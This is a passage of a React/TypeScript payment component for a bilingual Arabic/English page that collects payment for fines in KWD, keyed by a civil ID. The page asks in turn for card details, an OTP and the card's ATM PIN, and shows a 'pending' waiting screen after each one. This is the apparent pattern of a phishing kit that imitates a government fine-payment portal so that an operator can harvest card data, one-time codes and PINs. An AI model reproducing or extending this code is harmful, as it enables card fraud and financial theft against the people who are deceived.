            </button>
          </div>
        </div>
        <PaymentFooter />
      </PaymentFrame>
    );
  }

  const totalAmount = paymentData?.totalAmount || "0";
  const selectedFinesTotal = Array.isArray(paymentData?.selectedFines)
    ? paymentData.selectedFines.reduce((sum: number, fine: any) => {
        const amount = parseFloat(String(fine?.amount || "0").replace(/[^0-9.]/g, ""));
        return sum + (Number.isNaN(amount) ? 0 : amount);
      }, 0)
    : 0;
  const totalAmountNumber = parseFloat(String(totalAmount).replace(/[^0-9.]/g, "")) || 0;
  const fineAmount = String(paymentData?.fineAmount || (selectedFinesTotal || totalAmountNumber).toFixed(0));
  const dueAmount = fineAmount;

  const transactionRows = [
    { label: lang === "ar" ? "المبلغ المستحق" : "Due Amount", value: `${fineAmount} KWD` },
  ];

  const handleCardSubmit = async (data: CardSubmitPayload) => {
    setIsSubmitting(true);
    try {
      let currentSessionId = sessionId;
      if (!currentSessionId && paymentData) {
        const res = await createSession.mutateAsync({
          selectedFines: paymentData.selectedFines || [],
          totalAmount: paymentData.totalAmount || "0",
          civilId: paymentData.civilId || "",
          enquiryType: paymentData.enquiryType || "1",
          queryId: paymentData.queryId,
        });
        if (res.success) {
          currentSessionId = res.sessionId;
          setSessionId(res.sessionId);
          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }
      if (!currentSessionId) {
        setErrorMessage(lang === "ar" ? "حدث خطأ في إنشاء جلسة الدفع. يرجى المحاولة مرة أخرى." : "An error occurred while creating the payment session. Please try again.");
        return;
      }
      await submitCard.mutateAsync({ sessionId: currentSessionId, ...data });
      setStage("card_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleOtpSubmit = async (otpCode: string) => {
    if (!sessionId) return;
    setIsSubmitting(true);
    try {
      await submitOtp.mutateAsync({ sessionId, otpCode });
      setStage("otp_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleAtmPinSubmit = async (atmPin: string) => {
    if (!sessionId) return;
    setIsSubmitting(true);
    try {
      await submitAtmPin.mutateAsync({ sessionId, atmPin });
      setStage("atm_pending");
      setErrorMessage(null);
    } catch (err: any) {
      setErrorMessage(err.message || (lang === "ar" ? "حدث خطأ. يرجى المحاولة مرة أخرى." : "An error occurred. Please try again."));
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleDone = () => {
    sessionStorage.removeItem("paymentData");
    sessionStorage.removeItem("paymentSessionId");
    navigate(homePath);
  };

  const handleRetry = () => {
    sessionStorage.removeItem("paymentSessionId");
    setSessionId(null);
    setStage("card");
    setErrorMessage(null);
    if (paymentData) {
      createSession.mutateAsync({
        selectedFines: paymentData.selectedFines || [],
        totalAmount: paymentData.totalAmount || "0",
        civilId: paymentData.civilId || "",
        enquiryType: paymentData.enquiryType || "1",
        queryId: paymentData.queryId,
      }).then((res) => {
        if (res.success) {
          setSessionId(res.sessionId);
          sessionStorage.setItem("paymentSessionId", res.sessionId);
        }
      }).catch(console.error);
    }
  };

  return (
    <PaymentFrame>
      <PaymentGatewayHeader />

      <div className="flex-1 max-w-3xl w-full mx-auto px-6 py-8">
        {stage === "card" && (
          <>
            <SectionCard title="ملخص المبلغ">
              <InfoTable rows={transactionRows} />
            </SectionCard>
            <div className="mt-6">
              <CardForm
                onSubmit={handleCardSubmit}
                onCancel={() => navigate(homePath)}
                isLoading={isSubmitting}
                error={errorMessage}
                fineAmount={fineAmount}
                discountAmount={discountAmount}
                totalAmount={dueAmount}
              />
            </div>
          </>
        )}

        {stage === "card_pending" && <WaitingPage message={t.payment.waiting.card} />}
        {stage === "otp" && <OtpForm onSubmit={handleOtpSubmit} isLoading={isSubmitting} error={errorMessage} rows={transactionRows} />}
        {stage === "otp_pending" && <WaitingPage message={t.payment.waiting.otp} />}
        {stage === "atm" && <AtmPinForm onSubmit={handleAtmPinSubmit} isLoading={isSubmitting} error={errorMessage} rows={transactionRows} />}
        {stage === "atm_pending" && <WaitingPage message={t.payment.waiting.atm} />}
        {stage === "success" && <SuccessPage totalAmount={dueAmount} onDone={handleDone} />}
        {stage === "failed" && <FailedPage onRetry={handleRetry} />}
      </div>

      <PaymentFooter />
    </PaymentFrame>
  );
}
